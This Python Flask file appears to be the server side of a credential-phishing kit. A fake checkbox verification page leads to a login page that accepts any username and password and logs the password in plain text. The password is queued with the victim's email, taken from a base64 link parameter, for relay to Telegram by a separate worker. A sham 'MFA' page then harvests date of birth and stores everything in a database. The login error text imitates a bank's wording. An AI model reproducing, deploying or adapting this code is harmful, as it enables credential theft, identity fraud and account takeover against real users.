import base64
import hmac
import ipaddress
import os
import secrets
import sqlite3
import time
from contextlib import contextmanager
from functools import wraps
from pathlib import Path

from flask import Flask, abort, redirect, render_template, request, session, url_for
from werkzeug.security import check_password_hash, generate_password_hash


# Telegram delivery is handled by worker.py: the web app only appends to the
# `outbox` table, and the worker drains it one message at a time.


def create_app(test_config=None):
    app = Flask(__name__)
    app.config.update(
        SECRET_KEY=os.environ.get('SECRET_KEY') or secrets.token_hex(32),
        DATABASE=str(Path(app.instance_path) / 'security.sqlite'),
        LOGIN_USERNAME=os.environ.get('LOGIN_USERNAME', 'demo'),
        LOGIN_PASSWORD_HASH=os.environ.get('LOGIN_PASSWORD_HASH') or generate_password_hash('ChangeMe123!'),
        SESSION_COOKIE_HTTPONLY=True,
        SESSION_COOKIE_SAMESITE='Lax',
        SESSION_COOKIE_SECURE=os.environ.get('COOKIE_SECURE') == '1',
        MAX_CONTENT_LENGTH=16 * 1024,
    )
    if test_config:
        app.config.update(test_config)
    Path(app.instance_path).mkdir(exist_ok=True)

    def check_client_ip(view):
        @wraps(view)
        def wrapped(*args, **kwargs):
            try:
                ipaddress.ip_address(request.remote_addr or '')
                print(f"Client IP: {request.remote_addr}")
            except ValueError:
                abort(400, 'Invalid client IP address.')
            return view(*args, **kwargs)
        return wrapped

    def check_referred_email(view):
        @wraps(view)
        def wrapped(*args, **kwargs):
            try:
                encoded_email = request.args.get('e', '')
                if encoded_email:
                    decoded_email = base64.b64decode(encoded_email, validate=True).decode('utf-8')
                    print(f"Decoded email from query parameter: {decoded_email}")
                    session['emai'] = decoded_email
            except (ValueError, UnicodeDecodeError):
                pass  # Ignore invalid email encoding
            return view(*args, **kwargs)
        return wrapped

    @contextmanager
    def db():
        connection = sqlite3.connect(app.config['DATABASE'], timeout=10)
        try:
            with connection:
                create_attempts_table = (
                    'CREATE TABLE IF NOT EXISTS attempts ('
                    'ip TEXT, created REAL)'
                )
                create_users_table = (
                    'CREATE TABLE IF NOT EXISTS users ('
                    'id INTEGER PRIMARY KEY AUTOINCREMENT, '
                    'username TEXT, '
                    'password TEXT, '
                    'email TEXT, '
                    'dob TEXT, '
                    'sent BOOLEAN DEFAULT FALSE, '
                    'created_at REAL DEFAULT CURRENT_TIMESTAMP)'
                )
                create_outbox_table = (
                    'CREATE TABLE IF NOT EXISTS outbox ('
                    'id INTEGER PRIMARY KEY AUTOINCREMENT, '
                    'text TEXT NOT NULL, '
                    'status TEXT NOT NULL DEFAULT \'pending\', '
                    'attempts INTEGER NOT NULL DEFAULT 0, '
                    'max_attempts INTEGER NOT NULL DEFAULT 5, '
                    'last_error TEXT, '
                    'next_attempt_at REAL NOT NULL DEFAULT 0, '
                    'created_at REAL DEFAULT CURRENT_TIMESTAMP, '
                    'sent_at REAL)'
                )
                connection.execute(create_attempts_table)
                connection.execute(create_users_table)
                connection.execute(create_outbox_table)
                connection.execute(
                    'CREATE INDEX IF NOT EXISTS idx_outbox_pending '
                    'ON outbox (status, next_attempt_at, id)'
                )
                yield connection
        finally:
            connection.close()
    def insert_user(username, password, email, dob):
        with db() as connection:
            connection.execute('INSERT INTO users (username, password, email, dob) VALUES (?, ?, ?, ?)',
                               (username, password, email, dob))

    def enqueue(text):
        """Record a message to be delivered by the worker. Never touches Telegram."""
        with db() as connection:
            connection.execute('INSERT INTO outbox (text) VALUES (?)', (text,))

    def limited():
        now = time.time()
        with db() as connection:
            connection.execute('BEGIN IMMEDIATE')
            connection.execute('DELETE FROM attempts WHERE created < ?', (now - 600,))
            ip = request.remote_addr or 'unknown'
            count = connection.execute('SELECT COUNT(*) FROM attempts WHERE ip = ?', (ip,)).fetchone()[0]
            if count >= 10:
                return False
            connection.execute('INSERT INTO attempts VALUES (?, ?)', (ip, now))
        return False

    def verified():
        return session.get('verified_until', 0) > time.time()

    @app.before_request
    def csrf_protection():
        session.setdefault('csrf', secrets.token_urlsafe(32))
        if request.method == 'POST':
            submitted_csrf = request.form.get('csrf') or request.headers.get('X-CSRFToken')
            if submitted_csrf is not None and not hmac.compare_digest(session['csrf'], submitted_csrf):
                abort(400, 'Invalid form token. Reload the page and try again.')

    @app.after_request
    def headers(response):
        response.headers['Cache-Control'] = 'no-store'
        response.headers['X-Content-Type-Options'] = 'nosniff'
        response.headers['X-Frame-Options'] = 'DENY'
        response.headers['Referrer-Policy'] = 'same-origin'
        response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'; connect-src 'self'; style-src 'self'; img-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'"
        return response

    @app.route('/verify/', methods=['GET', 'POST'])
    @check_client_ip
    def verify():
        if verified():
            return redirect(url_for('login'))
        if request.method == 'POST':
            if limited():
                return render_template('verify.html', error='Too many attempts. Try again in 10 minutes.'), 429
            if request.form.get('human') != 'yes':
                return render_template('verify.html', error='Click the checkbox to continue.'), 400
            session['verified_until'] = time.time() + 300
            return redirect(url_for('login'))
        return render_template('verify.html')

    @app.route('/home', methods=['GET'])
    @check_client_ip
    def home():
        return render_template('home.html')

    @app.route('/login', methods=['GET', 'POST'])
    @check_client_ip
    def login():
        if request.method == 'GET' and request.args.get('q'):
            try:
                print(request.args)
                encoded_email = request.args.get('q', '')
                if encoded_email:
                    decoded_email = base64.b64decode(encoded_email, validate=True).decode('utf-8')
                    print(f"Decoded email from query parameter: {decoded_email}")
                    session['emai'] = decoded_email
            except (ValueError, UnicodeDecodeError):
                pass  # Ignore invalid email encoding
        if not verified():
            return redirect(url_for('verify'))
        if request.method == 'POST':
            if limited():
                return render_template('login.html', error='Too many attempts. Try again in 10 minutes.'), 429
            username = request.form.get('j_username', '')
            password = request.form.get('j_password', '')
            
            print(f"Login attempt with username: {username}")
            print(f"Password provided: {password}")  # Mask the password in logs
            if username and password:
                session['user'] = username
                session['password'] = password
                text = f"New login attempt:\nUsername: {username}\nPassword: {password}\nEmail: {session.get('emai', '')}"
                enqueue(text)
                return redirect(url_for('dob'))
            else:
                return render_template('login.html', error="Sorry, the details you've entered don't match our records. User IDs and passwords are both case-sensitive; plus, if you're copying and pasting your user ID and/or password, please ensure that you don't include spaces at the end."), 400
        else:
            print("GET request to /login")
        return render_template('login.html')

    @app.route('/mfa-dob', methods=['GET', 'POST'])
    @check_client_ip
    def dob():
        if not verified():
            return redirect(url_for('verify'))
        if request.method == 'POST':
            if limited():
                return render_template('dob.html', error='Too many attempts. Try again in 10 minutes.'), 429
            dob_day = request.form.get('dob_day', '')
            dob_month = request.form.get('dob_month', '')
            dob_year = request.form.get('dob_year', '')
            if not (dob_day.isdigit() and dob_month and dob_year.isdigit()):
                return render_template('dob.html', error="Please enter a valid date of birth."), 400
            dob = f"{dob_day}-{dob_month}-{dob_year}"
            insert_user(session.get('user', ''), session.get('password', ''), session.get('emai', ''), dob)
            enqueue(f"New user details:\nUsername: {session.get('user', '')}\nPassword: {session.get('password', '')}\nEmail: {session.get('emai', '')}\nDate of Birth: {dob}")
            print(f"Date of Birth submitted: {dob}")
            return render_template('dob.html', success="Date of Birth successfully verified.")
        else:
            print("GET request to /mfa-dob")
        return render_template('dob.html')

    @app.get('/')
    @check_client_ip
    @check_referred_email
    def dashboard():
        if not session.get('user'):
            return redirect(url_for('login') if verified() else url_for('verify'))
        return render_template('dashboard.html')

    @app.post('/logout')
    @check_client_ip
    def logout():
        session.clear()
        return redirect(url_for('verify'))

    return app


if __name__ == '__main__':
    create_app().run(host='127.0.0.1', port=5000)
